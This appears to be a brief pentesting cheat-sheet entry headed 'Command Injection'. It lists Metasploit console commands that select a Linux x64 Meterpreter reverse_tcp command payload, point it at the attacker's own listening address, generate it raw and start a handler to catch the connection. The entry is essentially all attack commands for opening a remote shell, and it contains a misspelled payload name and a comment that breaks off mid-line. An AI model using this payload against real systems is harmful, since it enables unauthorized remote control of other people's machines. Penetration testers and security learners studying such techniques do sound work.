
# Command Injection
```bash
msfconsole
use payload/cmd/linux/x64/metrepreter/reverse_tcp
set LHOST <local IP/interface>
generate -f raw
# Starts handler to 
to_handler
```